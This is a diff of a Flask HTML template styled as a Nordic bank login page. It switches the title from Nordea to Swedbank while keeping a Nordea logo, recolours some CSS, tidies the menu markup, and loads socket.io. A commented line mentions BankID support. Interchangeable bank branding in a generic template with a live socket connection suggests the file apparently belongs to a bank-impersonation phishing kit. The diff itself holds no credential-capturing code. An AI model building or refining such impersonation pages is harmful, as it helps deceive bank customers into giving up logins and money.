@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-    <title>Nordea</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }} ">
+    <!-- <script src="{{ url_for('static', filename='js/script.js') }}" defer></script> -->
+    <title>Swedbank</title>
     <style>
         /* Original CSS (unchanged) */
         body {
@@ -68,7 +68,7 @@
         }
 
         /* h2 {
-            color: #002337;
+            color: #fb4f00;
             margin-bottom: -20px;
             font-size: 1.5em;
         } */
@@ -82,7 +82,7 @@
         }
 
         p .verified-icon {
-            color: #002337;
+            color: #007aff;
             margin-right: 8px;
             margin-bottom: 50px;
         }
@@ -102,7 +102,7 @@
         button:hover {
             background-color: #183e4f;
         }
-
+        
         img {
             width: 20vh;
             margin: 20px;
@@ -233,6 +233,7 @@
 
         }
 
+
         .menu-section{
             display: flex;
             justify-content: space-between;
@@ -303,7 +304,8 @@
             100% {
                 transform: scale(2);
             }
-        }        
+        }
+        
 #loadingElement {
     display: flex;
     flex-direction: column;
@@ -321,19 +323,20 @@
     margin-right: auto;
 }
     </style>
+
 </head>
 <body>
     <div class="bank-container">
         <img  src="{{ url_for('static', filename='banks/nordea.png') }}" alt="Nordea Logo">
         <div class="content">
-            <div class="menu ">
-                <div id="menu-icon" style=" padding-right: 70px;">
+            <div class="menu">
+                <div id="menu-icon">
                     <span>
-                        <img style="width:20px; margin: 0;" src="{{ url_for('static', filename='logos/menu.svg')}}" alt="">
+                    <img style="width:20px; margin: 0;" src="{{ url_for('static', filename='logos/menu.svg')}}" alt="">
                     </span>
                     <p>Meny</p>
                 </div>
-                <div id="support-icon"  style=" padding-left: 120px;">
+                <div id="support-icon">
                     <span>
                         <img style="width:20px; margin: 0;" src="{{ url_for('static', filename='logos/support.svg')}}" alt="">
                     </span>
@@ -426,7 +429,7 @@
                 <div>
                     <span>
                         <img style="width:20px; margin: 0;" src="{{ url_for('static', filename='logos/search.svg')}}" alt="">
-                    </span> <!-- search Icon Emoji -->
+                        </span> <!-- search Icon Emoji -->
                     <!-- <p>BankID Support</p> -->
                 </div>
             </div>         
